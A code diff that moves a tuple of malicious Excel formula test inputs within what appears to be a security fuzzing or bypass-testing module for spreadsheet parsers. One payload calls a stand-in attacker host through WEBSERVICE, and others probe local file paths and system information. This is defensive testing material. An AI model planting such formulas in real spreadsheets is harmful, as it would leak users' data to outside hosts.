@@ -226,14 +226,6 @@ _EXCEL_HIGH_RISK_TAGS = (
 _EXCEL_HIGH_RISK_ATTRS = (
     'F', 'progId', 'odcFile', 'name', 'id', 'type', 'sqref', 'allowBlank', 'HyperlinkBase'
 )
-_EXCEL_THEMEVAL_FORMULAS = (
-    "=THEMEVAL()",
-    '=THEMEVAL()+INDIRECT("A1")',
-    '=THEMEVAL()+HYPERLINK("file://C:/")',
-    '=THEMEVAL()+WEBSERVICE("http://attacker")',
-    '=THEMEVAL()+INFO("system")',
-    '=THEMEVAL()+CELL("address")',
-)
 _EXCEL_CONTROL_IDS = (
     "{00000000-0000-0000-0000-000000000000}",
     "{F0000000-0000-0000-0000-000000000045}",
@@ -270,6 +262,14 @@ _EXCEL_DRAWING_REL_IDS = (
     "rId999999",
     "rId2147483647",
     "rId4294967295",
+)
+_EXCEL_THEMEVAL_FORMULAS = (
+    "=THEMEVAL()",
+    '=THEMEVAL()+INDIRECT("A1")',
+    '=THEMEVAL()+HYPERLINK("file://C:/")',
+    '=THEMEVAL()+WEBSERVICE("http://attacker")',
+    '=THEMEVAL()+INFO("system")',
+    '=THEMEVAL()+CELL("address")',
 )
 _BYPASS_HYPERLINK_REPEAT = 64
 _BYPASS_MEMORY_ROWS = 64
